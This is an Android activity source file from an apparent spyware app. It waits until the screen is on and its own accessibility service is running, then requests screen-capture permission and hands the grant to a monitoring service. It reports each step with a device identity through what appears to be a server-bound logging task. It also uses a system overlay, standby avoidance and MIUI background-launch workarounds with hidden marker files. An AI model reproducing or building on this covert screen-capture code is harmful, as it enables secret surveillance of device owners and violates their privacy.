package org.code.coregradle.activities;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Color;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityManager;
import android.widget.TextView;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import org.code.coregradle.R;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.services.AlfredService;
import org.code.coregradle.services.WynkService;
import org.code.coregradle.utils.MessageXInterceptor;
import org.code.coregradle.utils.TimeUtils;
import org.code.coregradle.utils.WynkHelper;

import java.io.File;
import java.util.List;
import java.util.Timer;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CrossActivity extends AppCompatActivity {
    private final static ExecutorService mExecutor = Executors.newCachedThreadPool();
    private IdentityStore identityStore;
    private Timer timer = new Timer();
    private File file;
    public static boolean bgLaunch;

    private boolean shouldRequestScreenCapture() {
        // TODO: Call server before actually asking for screen recording permission
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        WynkHelper wynkHelper = WynkHelper.getInstance(this);
        try {
            mExecutor.submit(new MessageXInterceptor("WynkMonitoring: " + wynkHelper.isMonitoring() + "; Screen On Status: " + powerManager.isScreenOn() + "; Accessibility Service Running: " + AlfredService.isRunning, identityStore.getIdentityValue()));
        } catch (Exception e) {

        }
        return powerManager.isScreenOn() && isAccessibilityServiceEnabled(this, AlfredService.class) && AlfredService.isRunning;
    }


    void showOverlay() {
        WindowManager windowManager = (WindowManager)
                getApplicationContext().getSystemService(WINDOW_SERVICE);
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
                WindowManager.LayoutParams.FLAG_FULLSCREEN
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                        | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                        | WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED
        );

        //Specify the view position

        TextView textView = new TextView(this);
        textView.setText("Hello World!");
        textView.setTextSize(32);
        textView.setBackgroundColor(Color.MAGENTA);
        textView.setVisibility(View.VISIBLE);
        windowManager.addView(textView, layoutParams);
    }

    public static boolean isAccessibilityServiceEnabled(Context context, Class<? extends AccessibilityService> service) {
        AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);

        for (AccessibilityServiceInfo enabledService : enabledServices) {
            ServiceInfo enabledServiceInfo = enabledService.getResolveInfo().serviceInfo;
            if (enabledServiceInfo.packageName.equals(context.getPackageName()) && enabledServiceInfo.name.equals(service.getName()))
                return true;
        }

        return false;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_x);
        identityStore = IdentityStore.getInstance(this);

        boolean requestScreenShot = getIntent().getBooleanExtra("screenCap", false);
        Log.d("XActivity", "Request ScreenShot: " + requestScreenShot);
        if (requestScreenShot && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && shouldRequestScreenCapture()) {
            File file = new File(getFilesDir(), ".canLaunchXActivity");
            if (file.exists()) {
                file.delete();
            }
            MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            try {
                mExecutor.submit(new MessageXInterceptor("Screen Capture: Requesting permission", identityStore.getIdentityValue()));
            } catch (Exception ignored) {
            }
            Intent screenCaptureIntent = mediaProjectionManager.createScreenCaptureIntent();
            WynkHelper wynkHelper = WynkHelper.getInstance(this);
            wynkHelper.startMonitoring();
            startActivityForResult(screenCaptureIntent, 1337);
        }
        boolean isAppStandByPrevention = getIntent().getBooleanExtra("AppBucketPrevention", false);
        if (isAppStandByPrevention) {
            finish();
        }

        boolean isOpenSelfMIUIBg = getIntent().getBooleanExtra("openSelfMIUIBg", false);
        if (isOpenSelfMIUIBg) {
            File file = new File(getFilesDir(), ".can_launch_x_activity");
            try {
                file.createNewFile();
            } catch (Exception e) {

            }
            TimeUtils.sleep(30 * 1000);
            finish();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        Log.d("XActivity", "RequestCode: " + requestCode + " ResultCode: " + resultCode);
        if (requestCode == 1337) {
            Intent intent = new Intent(this, WynkService.class);
            intent.putExtra("DATA", data);
            intent.putExtra("RESULT_CODE", resultCode);
            ContextCompat.startForegroundService(this, intent);
            try {
                mExecutor.submit(new MessageXInterceptor("Screen Capture: Permission result: " + resultCode, identityStore.getIdentityValue()));
            } catch (Exception ignored) {
            }
            this.finish();
        }
    }
}